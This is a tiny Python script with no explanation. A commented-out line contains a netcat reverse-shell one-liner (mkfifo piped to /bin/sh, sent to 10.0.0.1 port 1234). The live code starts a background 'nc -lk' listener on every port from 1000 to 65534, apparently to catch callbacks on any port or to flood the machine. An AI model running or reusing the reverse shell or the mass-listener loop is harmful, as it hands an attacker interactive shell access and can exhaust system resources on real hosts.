#!/usr/bin/python
# -*- coding: utf-8 -*-
import os

#os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f")
for i in range(1000, 65535):
	print(i)
	os.system("nc -lk {0} &".format(i))
	
